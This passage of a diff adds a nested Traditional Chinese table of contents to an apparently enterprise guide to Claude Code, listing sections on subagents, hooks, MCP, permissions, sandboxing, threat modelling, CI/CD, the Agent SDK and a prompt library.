+    - [16.8 動態 Context 注入](#168-動態-context-注入official)
+    - [16.9 附帶檔案](#169-附帶檔案official)
+    - [16.10 在 Subagent 中執行 Skill（fork）](#1610-在-subagent-中執行-skillforkofficial)
+    - [16.11 企業 Skills 目錄設計](#1611-企業-skills-目錄設計建議)
+    - [16.12 完整 Skill 範例：資料庫 Migration](#1612-完整-skill-範例資料庫-migration建議)
+    - [16.13 完整 Skill 範例：Legacy 分析](#1613-完整-skill-範例legacy-分析建議)
+    - [16.14 Skill 描述會被截短](#1614-skill-描述會被截短official)
+    - [16.15 本章實務案例](#1615-本章實務案例)
+    - [16.16 本章注意事項](#1616-本章注意事項)
 17. [Subagents](#17-subagents)
+    - [17.1 Subagent 是什麼](#171-subagent-是什麼official)
+    - [17.2 位置與優先權](#172-位置與優先權official)
+    - [17.3 Frontmatter 欄位](#173-frontmatter-欄位official)
+    - [17.4 內建 Subagents](#174-內建-subagentsofficial)
+    - [17.5 Subagent 啟動時載入什麼](#175-subagent-啟動時載入什麼official)
+    - [17.6 叫用方式](#176-叫用方式official)
+    - [17.7 工具控制](#177-工具控制official)
+    - [17.8 模型解析順序](#178-模型解析順序official)
+    - [17.9 深度與並行上限](#179-深度與並行上限official)
+    - [17.10 前景 vs. 背景](#1710-前景-vs-背景official)
+    - [17.11 續談 Subagent](#1711-續談-subagentofficial)
+    - [17.12 企業 AI Team：Subagent 角色定義](#1712-企業-ai-teamsubagent-角色定義建議)
+    - [17.13 完整 Subagent 範例](#1713-完整-subagent-範例)
+    - [17.14 Subagent 權限設計原則](#1714-subagent-權限設計原則建議)
+    - [17.15 本章實務案例](#1715-本章實務案例)
+    - [17.16 本章注意事項](#1716-本章注意事項)
 18. [平行化：Agent View、Agent Teams、Cross-session Messaging 與 Dynamic Workflows](#18-平行化agent-viewagent-teamscross-session-messaging-與-dynamic-workflows)
+    - [18.1 五種平行化方式的比較](#181-五種平行化方式的比較official)
+    - [18.2 Worktrees](#182-worktreesofficial)
+    - [18.3 Agent View（背景 session）](#183-agent-view背景-sessionpreview)
+    - [18.4 Cross-session Messaging](#184-cross-session-messagingofficial)
+    - [18.5 Agent Teams](#185-agent-teamspreview)
+    - [18.6 Dynamic Workflows](#186-dynamic-workflowsofficial)
+    - [18.7 `/batch`：大規模平行變更](#187-batch大規模平行變更official)
+    - [18.8 Claude Projects（雲端長期專案協調）（v1.2 新增）](#188-claude-projects雲端長期專案協調previewv12-新增)
+    - [18.9 本章實務案例](#189-本章實務案例)
+    - [18.10 本章注意事項](#1810-本章注意事項)
 19. [Hooks](#19-hooks)
+    - [19.1 Hook 是什麼，以及為什麼它最重要](#191-hook-是什麼以及為什麼它最重要official)
+    - [19.2 Hook 事件完整清單](#192-hook-事件完整清單official)
+    - [19.3 Hook 的五種型別](#193-hook-的五種型別official)
+    - [19.4 輸出格式](#194-輸出格式official)
+    - [19.5 企業品質閘門範例](#195-企業品質閘門範例建議)
+    - [19.6 企業安全與 Hook 治理](#196-企業安全與-hook-治理official)
+    - [19.7 除錯 Hook](#197-除錯-hookofficial)
+    - [19.8 本章實務案例](#198-本章實務案例)
+    - [19.9 本章注意事項](#199-本章注意事項)
 20. [MCP（Model Context Protocol）](#20-mcpmodel-context-protocol)
+    - [20.1 MCP 是什麼](#201-mcp-是什麼official)
+    - [20.2 新增 MCP Server](#202-新增-mcp-serverofficial)
+    - [20.3 Transport 比較](#203-transport-比較official)
+    - [20.4 Scope 與優先權](#204-scope-與優先權official)
+    - [20.5 `.mcp.json` 格式](#205-mcpjson-格式official)
+    - [20.6 認證](#206-認證official)
+    - [20.7 工具命名與 Tool Search](#207-工具命名與-tool-searchofficial)
+    - [20.8 環境變數](#208-環境變數official)
+    - [20.9 企業 MCP 治理](#209-企業-mcp-治理official--建議)
+    - [20.10 MCP 的安全風險](#2010-mcp-的安全風險official)
+    - [20.11 MCP 2026-07-28 協定與 v1.2 新增控制（v1.2 新增）](#2011-mcp-2026-07-28-協定與-v12-新增控制officialv12-新增)
+    - [20.12 本章實務案例](#2012-本章實務案例)
+    - [20.13 本章注意事項](#2013-本章注意事項)
 21. [Plugins 與 Marketplace](#21-plugins-與-marketplace)
+    - [21.1 Plugin 是什麼](#211-plugin-是什麼official)
+    - [21.2 目錄結構](#212-目錄結構official)
+    - [21.3 plugin.json](#213-pluginjsonofficial)
+    - [21.4 開發與測試](#214-開發與測試official)
+    - [21.5 企業散布：私有 Marketplace](#215-企業散布私有-marketplaceofficial--建議)
+    - [21.6 官方與社群 Marketplace](#216-官方與社群-marketplaceofficial)
+    - [21.7 值得注意的官方 Plugin](#217-值得注意的官方-pluginofficial)
+    - [21.8 從獨立設定遷移到 Plugin](#218-從獨立設定遷移到-pluginofficial)
+    - [21.9 Plugin 對 Prompt Cache 的影響](#219-plugin-對-prompt-cache-的影響official)
+    - [21.10 Plugin 相依與版本約束（v1.1 新增）](#2110-plugin-相依與版本約束officialv11-新增)
+    - [21.11 Plugin Relevance：讓 Claude 主動推薦企業 Plugin（v1.1 新增）](#2111-plugin-relevance讓-claude-主動推薦企業-pluginofficialv11-新增)
+    - [21.12 Plugin Evals：以 eval 套件驗證 plugin（v1.2 新增）](#2112-plugin-evals以-eval-套件驗證-pluginofficialv12-新增)
+    - [21.13 本章實務案例](#2113-本章實務案例)
+    - [21.14 本章注意事項](#2114-本章注意事項)
 
-### 第五部　安全、權限與沙箱
+</details>
+
+<details open>
+<summary><strong>第五部　安全、權限與沙箱</strong>（第 22–26 章）</summary>
 
 22. [Permission Model 與 Permission Modes](#22-permission-model-與-permission-modes)
+    - [22.1 分層的權限系統](#221-分層的權限系統official)
+    - [22.2 六種權限模式完整說明](#222-六種權限模式完整說明official)
+    - [22.3 三條不變的規則](#223-三條不變的規則official)
+    - [22.4 任何模式都不會自動核准的動作](#224-任何模式都不會自動核准的動作official)
+    - [22.5 權限規則語法](#225-權限規則語法official)
+    - [22.6 auto mode 的設定：`autoMode`](#226-auto-mode-的設定automodeofficial)
+    - [22.7 企業權限設計 SOP](#227-企業權限設計-sop建議)
+    - [22.8 `/fewer-permission-prompts`](#228-fewer-permission-promptsofficial)
+    - [22.9 本章實務案例](#229-本章實務案例)
+    - [22.10 本章注意事項](#2210-本章注意事項)
 23. [Sandboxing 與 Sandbox Environments](#23-sandboxing-與-sandbox-environments)
+    - [23.1 兩個層次：沙箱 vs. 隔離環境](#231-兩個層次沙箱-vs-隔離環境official)
+    - [23.2 六種隔離方案比較](#232-六種隔離方案比較official)
+    - [23.3 選型](#233-選型official)
+    - [23.4 Bash 沙箱設定](#234-bash-沙箱設定official)
+    - [23.5 檔案系統隔離](#235-檔案系統隔離official)
+    - [23.6 網路隔離](#236-網路隔離official)
+    - [23.7 Unsandboxed Retry 逃生門](#237-unsandboxed-retry-逃生門official)
+    - [23.8 Sandbox Runtime：把整個行程放進沙箱](#238-sandbox-runtime把整個行程放進沙箱preview)
+    - [23.9 Dev Container](#239-dev-containerofficial)
+    - [23.10 隔離與權限模式的關係](#2310-隔離與權限模式的關係official)
+    - [23.11 企業如何強制隔離](#2311-企業如何強制隔離official)
+    - [23.12 沙箱的安全限制](#2312-沙箱的安全限制official)
+    - [23.13 本章實務案例](#2313-本章實務案例)
+    - [23.14 本章注意事項](#2314-本章注意事項)
 24. [AI Agent 威脅模型](#24-ai-agent-威脅模型)
+    - [24.1 為什麼需要專屬的威脅模型](#241-為什麼需要專屬的威脅模型建議)
+    - [24.2 七大威脅類別【建議，基於官方安全文件】](#242-七大威脅類別建議基於官方安全文件)
+    - [24.3 T1：Prompt Injection](#243-t1prompt-injectionofficial)
+    - [24.4 T2：惡意 Repository](#244-t2惡意-repositoryofficial)
+    - [24.5 T3：第三方擴充供應鏈](#245-t3第三方擴充供應鏈official)
+    - [24.6 T4：資料外洩](#246-t4資料外洩official)
+    - [24.7 T5：過度權限與 Blast Radius](#247-t5過度權限與-blast-radius建議)
+    - [24.8 T6：產出品質風險](#248-t6產出品質風險建議)
+    - [24.9 T7：Deep Link 與外部觸發入口](#249-t7deep-link-與外部觸發入口official)
+    - [24.10 完整的企業威脅緩解矩陣](#2410-完整的企業威脅緩解矩陣建議)
+    - [24.11 本章實務案例](#2411-本章實務案例)
+    - [24.12 本章注意事項](#2412-本章注意事項)
 25. [安全開發：OWASP、SAST 與安全審查](#25-安全開發owaspsast-與安全審查)
+    - [25.1 四層安全審查架構](#251-四層安全審查架構official)
+    - [25.2 Security Guidance Plugin](#252-security-guidance-pluginofficial)
+    - [25.3 隨選安全掃描：`/security-review` 與 Claude Security Plugin](#253-隨選安全掃描security-review-與-claude-security-pluginofficial)
+    - [25.4 OWASP Top 10 對應檢查清單](#254-owasp-top-10-對應檢查清單建議)
+    - [25.5 CI 中的 SAST 與相依性掃描](#255-ci-中的-sast-與相依性掃描建議)
+    - [25.6 本章實務案例](#256-本章實務案例)
+    - [25.7 本章注意事項](#257-本章注意事項)
 26. [Secrets 與敏感資料治理](#26-secrets-與敏感資料治理)
+    - [26.1 五個必須守住的原則](#261-五個必須守住的原則建議)
+    - [26.2 憑證儲存機制](#262-憑證儲存機制official)
+    - [26.3 阻擋讀取](#263-阻擋讀取official--建議)
+    - [26.4 Mask 模式：需要憑證但不想曝露](#264-mask-模式需要憑證但不想曝露official)
+    - [26.5 三個偵測點](#265-三個偵測點建議)
+    - [26.6 Cloud Session 的 Secret 處理](#266-cloud-session-的-secret-處理official)
+    - [26.7 Transcript 與 Memory 的資料治理](#267-transcript-與-memory-的資料治理建議)
+    - [26.8 ZDR（Zero Data Retention）](#268-zdrzero-data-retentionofficial)
+    - [26.9 本章實務案例](#269-本章實務案例)
+    - [26.10 本章注意事項](#2610-本章注意事項)
 
-### 第六部　AI 驅動的軟體開發
+</details>
+
+<details open>
+<summary><strong>第六部　AI 驅動的軟體開發</strong>（第 27–36 章）</summary>
 
 27. [Prompt Engineering](#27-prompt-engineering)
+    - [27.1 一個 Prompt 的品質，由五件事決定](#271-一個-prompt-的品質由五件事決定建議)
+    - [27.2 不好的 Prompt vs. 好的 Prompt](#272-不好的-prompt-vs-好的-promptofficial--建議)
+    - [27.3 企業級 Prompt Template](#273-企業級-prompt-template建議)
+    - [27.4 九種任務型 Prompt](#274-九種任務型-prompt建議)
+    - [27.5 讓 Claude 訪談你](#275-讓-claude-訪談你official)
+    - [27.6 提供豐富的輸入](#276-提供豐富的輸入official)
+    - [27.7 Prompt 的反模式](#277-prompt-的反模式建議)
+    - [27.8 本章實務案例](#278-本章實務案例)
+    - [27.9 本章注意事項](#279-本章注意事項)
 28. [Context Engineering](#28-context-engineering)
+    - [28.1 Context Engineering 不等於 Prompt Engineering](#281-context-engineering-不等於-prompt-engineering建議)
+    - [28.2 五種 Context 病理](#282-五種-context-病理建議)
+    - [28.3 Context 預算思維](#283-context-預算思維建議)
+    - [28.4 七個 Context Engineering 技巧](#284-七個-context-engineering-技巧official--建議)
+    - [28.5 Monorepo 的 Context Engineering](#285-monorepo-的-context-engineeringofficial)
+    - [28.6 本章實務案例](#286-本章實務案例)
+    - [28.7 本章注意事項](#287-本章注意事項)
 29. [Spec-Driven Development 與 Plan Mode](#29-spec-driven-development-與-plan-mode)
+    - [29.1 為什麼需要 Spec](#291-為什麼需要-spec建議)
+    - [29.2 Spec-Driven Development 流程](#292-spec-driven-development-流程建議)
+    - [29.3 Plan Mode 完整用法](#293-plan-mode-完整用法official)
+    - [29.4 SPEC.md 範本](#294-specmd-範本建議)
+    - [29.5 ADR（Architecture Decision Record）](#295-adrarchitecture-decision-record建議)
+    - [29.6 從 Spec 到 Task 的拆解](#296-從-spec-到-task-的拆解建議)
+    - [29.7 `/goal`：讓 Claude 持續工作到達成](#297-goal讓-claude-持續工作到達成official)
+    - [29.8 四種驗證強度](#298-四種驗證強度official)
+    - [29.9 本章實務案例](#299-本章實務案例)
+    - [29.10 本章注意事項](#2910-本章注意事項)
 30. [Web Application 開發](#30-web-application-開發)
+    - [30.1 本章的技術棧假設](#301-本章的技術棧假設建議)
+    - [30.2 前端開發：Vue 3](#302-前端開發vue-3)
+    - [30.3 前端開發：Angular](#303-前端開發angular)
+    - [30.4 後端開發：Spring Boot](#304-後端開發spring-boot)
+    - [30.5 前後端契約：OpenAPI 驅動](#305-前後端契約openapi-驅動建議)
+    - [30.6 Design System 與元件庫](#306-design-system-與元件庫建議)
+    - [30.7 i18n 與 RWD 的自動檢查](#307-i18n-與-rwd-的自動檢查建議)
+    - [30.8 本章實務案例](#308-本章實務案例)
+    - [30.9 本章注意事項](#309-本章注意事項)
 31. [Enterprise Architecture 與架構邊界守護](#31-enterprise-architecture-與架構邊界守護)
+    - [31.1 典型的企業 Web 應用架構](#311-典型的企業-web-應用架構建議)
+    - [31.2 讓 Claude Code 遵守架構邊界的四層機制](#312-讓-claude-code-遵守架構邊界的四層機制建議)
+    - [31.3 Hexagonal Architecture（Ports & Adapters）](#313-hexagonal-architectureports--adapters建議)
+    - [31.4 讓 Claude 產出架構圖](#314-讓-claude-產出架構圖建議)
+    - [31.5 本章實務案例](#315-本章實務案例)
+    - [31.6 本章注意事項](#316-本章注意事項)
 32. [Clean Architecture + ArchUnit](#32-clean-architecture--archunit)
+    - [32.1 為什麼 ArchUnit 是必要的](#321-為什麼-archunit-是必要的建議)
+    - [32.2 完整的 ArchUnit 測試範例](#322-完整的-archunit-測試範例建議)
+    - [32.3 用 Claude 產生 ArchUnit 測試](#323-用-claude-產生-archunit-測試建議)
+    - [32.4 導入策略：避免一次 34 個紅燈](#324-導入策略避免一次-34-個紅燈建議)
+    - [32.5 CI 整合](#325-ci-整合建議)
+    - [32.6 CLAUDE.md 中的配套規則](#326-claudemd-中的配套規則建議)
+    - [32.7 本章實務案例](#327-本章實務案例)
+    - [32.8 本章注意事項](#328-本章注意事項)
 33. [Legacy 逆向工程](#33-legacy-逆向工程)
+    - [33.1 為什麼 Legacy 逆向工程是 Claude Code 最有價值的應用](#331-為什麼-legacy-逆向工程是-claude-code-最有價值的應用建議)
+    - [33.2 Evidence-First 原則](#332-evidence-first-原則建議)
+    - [33.3 完整的逆向工程流程](#333-完整的逆向工程流程建議)
+    - [33.4 各階段的 Prompt](#334-各階段的-prompt建議)
+    - [33.5 各類 Legacy 技術的注意事項](#335-各類-legacy-技術的注意事項建議)
+    - [33.6 從分析到 SRS](#336-從分析到-srs建議)
+    - [33.7 現代化計畫](#337-現代化計畫建議)
+    - [33.8 行為等價驗證](#338-行為等價驗證建議)
+    - [33.9 本章實務案例](#339-本章實務案例)
+    - [33.10 本章注意事項](#3310-本章注意事項)
 34. [Framework Upgrade / Migration](#34-framework-upgrade--migration)
+    - [34.1 升級的六階段方法](#341-升級的六階段方法建議)
+    - [34.2 階段 1：分析](#342-階段-1分析建議)
+    - [34.3 階段 2：升級計畫](#343-階段-2升級計畫建議)
+    - [34.4 階段 3：執行](#344-階段-3執行建議)
+    - [34.5 效能回歸驗證](#345-效能回歸驗證建議)
+    - [34.6 涵蓋範圍](#346-涵蓋範圍建議)
+    - [34.7 用 Workflow 處理大規模遷移](#347-用-workflow-處理大規模遷移official)
+    - [34.8 本章實務案例](#348-本章實務案例)
+    - [34.9 本章注意事項](#349-本章注意事項)
 35. [Testing、TDD 與 BDD](#35-testingtdd-與-bdd)
+    - [35.1 為什麼測試在 AI 開發中更重要](#351-為什麼測試在-ai-開發中更重要official)
+    - [35.2 測試金字塔與 Claude Code](#352-測試金字塔與-claude-code建議)
+    - [35.3 各類測試的 Prompt](#353-各類測試的-prompt建議)
+    - [35.4 TDD 流程](#354-tdd-流程建議)
+    - [35.5 BDD 流程](#355-bdd-流程建議)
+    - [35.6 從失敗到修復的循環](#356-從失敗到修復的循環建議)
+    - [35.7 測試品質的反模式](#357-測試品質的反模式建議)
+    - [35.8 覆蓋率的正確用法](#358-覆蓋率的正確用法建議)
+    - [35.9 本章實務案例](#359-本章實務案例)
+    - [35.10 本章注意事項](#3510-本章注意事項)
 36. [Code Review：AI Review ≠ Human Review](#36-code-reviewai-review--human-review)
+    - [36.1 四種 Review 機制的定位](#361-四種-review-機制的定位official)
+    - [36.2 `/code-review`](#362-code-reviewofficial)
+    - [36.3 Code Review 託管服務](#363-code-review-託管服務preview)
+    - [36.4 ultrareview](#364-ultrareviewofficial)
+    - [36.5 AI Review ≠ Human Review](#365-ai-review--human-review建議)
+    - [36.6 企業 Code Review Checklist](#366-企業-code-review-checklist建議)
+    - [36.7 本章實務案例](#367-本章實務案例)
+    - [36.8 本章注意事項](#368-本章注意事項)
 
-### 第七部　工程流程與 DevSecOps
+</details>
+
+<details open>
+<summary><strong>第七部　工程流程與 DevSecOps</strong>（第 37–43 章）</summary>
 
 37. [Git、GitHub 與 GitLab 工作流](#37-gitgithub-與-gitlab-工作流)
+    - [37.1 Claude Code 與 Git 的關係](#371-claude-code-與-git-的關係official)
+    - [37.2 企業標準 Git 工作流](#372-企業標準-git-工作流建議)
+    - [37.3 分支策略](#373-分支策略建議)
+    - [37.4 Commit 相關的 Prompt](#374-commit-相關的-prompt建議)
+    - [37.5 Attribution 設定](#375-attribution-設定official)
+    - [37.6 PR 相關工作流](#376-pr-相關工作流official--建議)
+    - [37.7 Conflict 解決](#377-conflict-解決建議)
+    - [37.8 GitHub 整合](#378-github-整合official)
+    - [37.9 GitLab 整合【Official / Beta】](#379-gitlab-整合official--beta)
+    - [37.10 本章實務案例](#3710-本章實務案例)
+    - [37.11 本章注意事項](#3711-本章注意事項)
 38. [CI/CD 整合](#38-cicd-整合)
+    - [38.1 三種 CI 整合模式](#381-三種-ci-整合模式official)
+    - [38.2 Claude Code GitHub Action](#382-claude-code-github-actionofficial)
+    - [38.3 GitLab CI/CD【Official / Beta】](#383-gitlab-cicdofficial--beta)
+    - [38.4 通用 CI 模式：`claude -p`](#384-通用-ci-模式claude--pofficial--建議)
+    - [38.5 CI 中的失敗處理](#385-ci-中的失敗處理official)
+    - [38.6 無人可回答權限提示時](#386-無人可回答權限提示時official)
+    - [38.7 完整的企業 CI Pipeline](#387-完整的企業-ci-pipeline建議)
+    - [38.8 本章實務案例](#388-本章實務案例)
+    - [38.9 本章注意事項](#389-本章注意事項)
 39. [DevOps / DevSecOps 全流程](#39-devops--devsecops-全流程)
+    - [39.1 Claude Code 在 DevOps 各階段的角色](#391-claude-code-在-devops-各階段的角色建議)
+    - [39.2 IaC 與 Claude Code](#392-iac-與-claude-code建議)
+    - [39.3 Dockerfile 與容器](#393-dockerfile-與容器建議)
+    - [39.4 部署腳本與 Runbook](#394-部署腳本與-runbook建議)
+    - [39.5 事故分析](#395-事故分析建議)
+    - [39.6 DevSecOps 的左移](#396-devsecops-的左移建議)
+    - [39.7 本章實務案例](#397-本章實務案例)
+    - [39.8 本章注意事項](#398-本章注意事項)
 40. [Database 開發](#40-database-開發)
+    - [40.1 三層防護](#401-三層防護建議)
+    - [40.2 Claude Code 可以協助的資料庫工作](#402-claude-code-可以協助的資料庫工作建議)
+    - [40.3 多資料庫的注意事項](#403-多資料庫的注意事項建議)
+    - [40.4 Migration 開發](#404-migration-開發建議)
+    - [40.5 查詢最佳化](#405-查詢最佳化建議)
+    - [40.6 Stored Procedure 分析](#406-stored-procedure-分析建議)
+    - [40.7 Data Dictionary 產出](#407-data-dictionary-產出建議)
+    - [40.8 唯讀 MCP Server 設定](#408-唯讀-mcp-server-設定建議)
+    - [40.9 本章實務案例](#409-本章實務案例)
+    - [40.10 本章注意事項](#4010-本章注意事項)
 41. [Observability](#41-observability)
+    - [41.1 兩種可觀測性](#411-兩種可觀測性建議)
+    - [41.2 Claude Code 的 OpenTelemetry](#412-claude-code-的-opentelemetryofficial)
+    - [41.3 企業 Dashboard 設計](#413-企業-dashboard-設計建議)
+    - [41.4 Claude Code 協助建立應用的可觀測性](#414-claude-code-協助建立應用的可觀測性建議)
+    - [41.5 Log 分析](#415-log-分析建議)
+    - [41.6 v1.2 補齊的遙測訊號與政策驗證（v1.2 新增）](#416-v12-補齊的遙測訊號與政策驗證officialv12-新增)
+    - [41.7 本章實務案例](#417-本章實務案例)
+    - [41.8 本章注意事項](#418-本章注意事項)
 42. [自動化：Hooks、Routines、Scheduled Tasks、Channels 與 Headless](#42-自動化hooksroutinesscheduled-taskschannels-與-headless)
+    - [42.1 五種自動化機制比較](#421-五種自動化機制比較official)
+    - [42.2 `/loop`](#422-loopofficial)
+    - [42.3 Routines（雲端排程）](#423-routines雲端排程preview)
+    - [42.4 Desktop Scheduled Tasks](#424-desktop-scheduled-tasksofficial)
+    - [42.5 Channels](#425-channelspreview)
+    - [42.6 自動化的企業決策樹](#426-自動化的企業決策樹建議)
+    - [42.7 本章實務案例](#427-本章實務案例)
+    - [42.8 本章注意事項](#428-本章注意事項)
 43. [Agent SDK 與自建企業 Agent 平台](#43-agent-sdk-與自建企業-agent-平台)
+    - [43.1 Agent SDK 是什麼](#431-agent-sdk-是什麼official)
+    - [43.2 四種 Anthropic 工具的定位](#432-四種-anthropic-工具的定位official)
+    - [43.3 SDK 可用的 Claude Code 能力](#433-sdk-可用的-claude-code-能力official)
+    - [43.4 企業何時該用 Agent SDK](#434-企業何時該用-agent-sdk建議)
+    - [43.5 安全部署](#435-安全部署official--建議)
+    - [43.6 多租戶的 Session 與 Memory 隔離](#436-多租戶的-session-與-memory-隔離official)
+    - [43.7 從 CLI 到 SDK 的漸進路徑](#437-從-cli-到-sdk-的漸進路徑建議)
+    - [43.8 SDK 的本質：一個受監管的 CLI 子行程（v1.2 新增）](#438-sdk-的本質一個受監管的-cli-子行程officialv12-新增)
+    - [43.9 設定來源：`settingSources` 與「關不掉的輸入」（v1.2 新增）](#439-設定來源settingsources-與關不掉的輸入officialv12-新增)
+    - [43.10 權限：評估順序與六種模式（v1.2 新增）](#4310-權限評估順序與六種模式officialv12-新增)
+    - [43.11 Agent Loop 的控制：回合、預算、effort 與結果（v1.2 新增）](#4311-agent-loop-的控制回合預算effort-與結果officialv12-新增)
+    - [43.12 System Prompt 策略（v1.2 新增）](#4312-system-prompt-策略officialv12-新增)
+    - [43.13 Subagent：定義、繼承與成本上限（v1.2 新增）](#4313-subagent定義繼承與成本上限officialv12-新增)
+    - [43.14 Sessions 與 SessionStore：跨主機續接（v1.2 新增）](#4314-sessions-與-sessionstore跨主機續接officialv12-新增)
+    - [43.15 SDK Hooks：Python 與 TypeScript 的支援差異（v1.2 新增）](#4315-sdk-hookspython-與-typescript-的支援差異officialv12-新增)
+    - [43.16 MCP 與自訂工具（v1.2 新增）](#4316-mcp-與自訂工具officialv12-新增)
+    - [43.17 可觀測性與成本追蹤（v1.2 新增）](#4317-可觀測性與成本追蹤officialv12-新增)
+    - [43.18 Hosting：部署模式、資源與多租戶（v1.2 新增）](#4318-hosting部署模式資源與多租戶officialv12-新增)
+    - [43.19 安全部署：隔離技術、Proxy Pattern 與檔案系統（v1.2 新增）](#4319-安全部署隔離技術proxy-pattern-與檔案系統officialv12-新增)
+    - [43.20 版本遷移、已移除的 API 與企業參考架構（v1.2 新增）](#4320-版本遷移已移除的-api-與企業參考架構v12-新增)
+    - [43.21 本章實務案例](#4321-本章實務案例)
+    - [43.22 本章注意事項](#4322-本章注意事項)
 
-### 第八部　組織、治理與落地
+</details>
+
+<details open>
+<summary><strong>第八部　組織、治理與落地</strong>（第 44–52 章）</summary>
 
 44. [AI-SDLC 與角色工作方式的改變](#44-ai-sdlc-與角色工作方式的改變)
+    - [44.1 企業 AI-SDLC 全景](#441-企業-ai-sdlc-全景建議)
+    - [44.2 各階段 Claude Code 的介入方式](#442-各階段-claude-code-的介入方式建議)
+    - [44.3 九個角色的工作方式改變](#443-九個角色的工作方式改變建議)
+    - [44.4 RACI 矩陣](#444-raci-矩陣建議)
+    - [44.5 本章實務案例](#445-本章實務案例)
+    - [44.6 本章注意事項](#446-本章注意事項)
 45. [Enterprise AI Agent Team 設計](#45-enterprise-ai-agent-team-設計)
+    - [45.1 兩種「Agent Team」的區別](#451-兩種agent-team的區別建議)
+    - [45.2 企業 Agent Matrix](#452-企業-agent-matrix建議)
+    - [45.3 Agent 定義規範表](#453-agent-定義規範表建議)
+    - [45.4 完整的 Agent Matrix](#454-完整的-agent-matrix建議)
+    - [45.5 Handoff 流程](#455-handoff-流程建議)
+    - [45.6 何時該用 Agent Teams（技術功能）](#456-何時該用-agent-teams技術功能official--建議)
+    - [45.7 本章實務案例](#457-本章實務案例)
+    - [45.8 本章注意事項](#458-本章注意事項)
 46. [企業 Repository 標準結構與共用平台](#46-企業-repository-標準結構與共用平台)
+    - [46.1 標準專案結構](#461-標準專案結構建議)
+    - [46.2 `.gitignore` 必要條目](#462-gitignore-必要條目建議)
+    - [46.3 CODEOWNERS](#463-codeowners建議)
+    - [46.4 共用平台的三個層次](#464-共用平台的三個層次建議)
+    - [46.5 Corporate Plugin 的內容](#465-corporate-plugin-的內容建議)
+    - [46.6 新專案的起手式](#466-新專案的起手式建議)
+    - [46.7 Monorepo 的結構](#467-monorepo-的結構official)
+    - [46.8 本章實務案例](#468-本章實務案例)
+    - [46.9 本章注意事項](#469-本章注意事項)
 47. [十二個企業實戰案例](#47-十二個企業實戰案例)
+    - [47.1 Case 1：建立新的 Web Application](#471-case-1建立新的-web-application)
+    - [47.2 Case 2：新增 REST API](#472-case-2新增-rest-api)
+    - [47.3 Case 3：新增 Vue Feature](#473-case-3新增-vue-feature)
+    - [47.4 Case 4：新增 Angular Feature](#474-case-4新增-angular-feature)
+    - [47.5 Case 5：Bug Fix](#475-case-5bug-fix)
+    - [47.6 Case 6：Legacy 逆向工程](#476-case-6legacy-逆向工程)
+    - [47.7 Case 7：Framework Upgrade](#477-case-7framework-upgrade)
+    - [47.8 Case 8：Database Migration](#478-case-8database-migration)
+    - [47.9 Case 9：Security Review](#479-case-9security-review)
+    - [47.10 Case 10：Performance Optimization](#4710-case-10performance-optimization)
+    - [47.11 Case 11：大型 Refactoring](#4711-case-11大型-refactoring)
+    - [47.12 Case 12：建立 CI/CD](#4712-case-12建立-cicd)
+    - [47.13 Case 13（延伸）：金融業 Legacy 現代化](#4713-case-13延伸金融業-legacy-現代化)
+    - [47.14 案例總結：共通模式](#4714-案例總結共通模式建議)
 48. [常見錯誤與反模式](#48-常見錯誤與反模式)
+    - [48.1 二十五個錯誤使用方式](#481-二十五個錯誤使用方式建議)
+    - [48.2 十個 Prompt 反模式](#482-十個-prompt-反模式建議)
+    - [48.3 五個治理反模式](#483-五個治理反模式建議)
+    - [48.4 本章實務案例](#484-本章實務案例)
+    - [48.5 本章注意事項](#485-本章注意事項)
 49. [Troubleshooting](#49-troubleshooting)
+    - [49.1 先做這三件事](#491-先做這三件事official)
+    - [49.2 安裝問題](#492-安裝問題)
+    - [49.3 登入與認證問題](#493-登入與認證問題)
+    - [49.4 設定沒生效](#494-設定沒生效)
+    - [49.5 效能與穩定性](#495-效能與穩定性official)
+    - [49.6 Windows / WSL 專屬](#496-windows--wsl-專屬)
+    - [49.7 網路與 Proxy](#497-網路與-proxy)
+    - [49.8 Claude 行為異常](#498-claude-行為異常)
+    - [49.9 排錯決策樹](#499-排錯決策樹建議)
+    - [49.10 本章注意事項](#4910-本章注意事項)
 50. [維運、升級策略與導入 Roadmap](#50-維運升級策略與導入-roadmap)
+    - [50.1 企業要維運什麼](#501-企業要維運什麼建議)
+    - [50.2 各項的維運節奏](#502-各項的維運節奏建議)
+    - [50.3 升級策略](#503-升級策略建議)
+    - [50.4 導入 Roadmap（七階段）](#504-導入-roadmap七階段建議)
+    - [50.5 KPI 與成效衡量](#505-kpi-與成效衡量建議)
+    - [50.6 官方 Adoption Kit：Communications Kit 與 Champion Kit（v1.1 新增）](#506-官方-adoption-kitcommunications-kit-與-champion-kitofficialv11-新增)
+    - [50.7 業界導入經驗與研究（v1.2 新增）](#507-業界導入經驗與研究v12-新增community)
+    - [50.8 本章實務案例](#508-本章實務案例)
+    - [50.9 本章注意事項](#509-本章注意事項)
 51. [Prompt Library（30 則）](#51-prompt-library30-則)
+    - [P-01：Repository 分析（第一次接觸專案）](#p-01repository-分析第一次接觸專案)
+    - [P-02：架構現況掃描](#p-02架構現況掃描)
+    - [P-03：影響範圍分析（給 PM / BA）](#p-03影響範圍分析給-pm--ba)
+    - [P-04：需求訪談與 SRS 產生](#p-04需求訪談與-srs-產生)
+    - [P-05：API 設計](#p-05api-設計)
+    - [P-06：資料庫設計](#p-06資料庫設計)
+    - [P-07：Feature 開發（完整版）](#p-07feature-開發完整版)
+    - [P-08：Bug Fix（三階段）](#p-08bug-fix三階段)
+    - [P-09：重構](#p-09重構)
+    - [P-10：Code Review](#p-10code-review)
+    - [P-11：安全審查](#p-11安全審查)
+    - [P-12：效能審查](#p-12效能審查)
+    - [P-13：測試產生](#p-13測試產生)
+    - [P-14：TDD 循環](#p-14tdd-循環)
+    - [P-15：BDD 實作](#p-15bdd-實作)
+    - [P-16：Legacy 分析（範圍界定）](#p-16legacy-分析範圍界定)
+    - [P-17：Legacy 逆向工程（業務規則萃取）](#p-17legacy-逆向工程業務規則萃取)
+    - [P-18：SRS 重建](#p-18srs-重建)
+    - [P-19：Framework 升級分析](#p-19framework-升級分析)
+    - [P-20：相依套件升級](#p-20相依套件升級)
+    - [P-21：分階段遷移計畫](#p-21分階段遷移計畫)
+    - [P-22：CI/CD 建立](#p-22cicd-建立)
+    - [P-23：Dockerfile](#p-23dockerfile)
+    - [P-24：IaC 撰寫](#p-24iac-撰寫)
+    - [P-25：文件產生](#p-25文件產生)
+    - [P-26：ADR 產生](#p-26adr-產生)
+    - [P-27：Release Note](#p-27release-note)
+    - [P-28：事故分析](#p-28事故分析)
+    - [P-29：生產問題排查（大檔案分析）](#p-29生產問題排查大檔案分析)
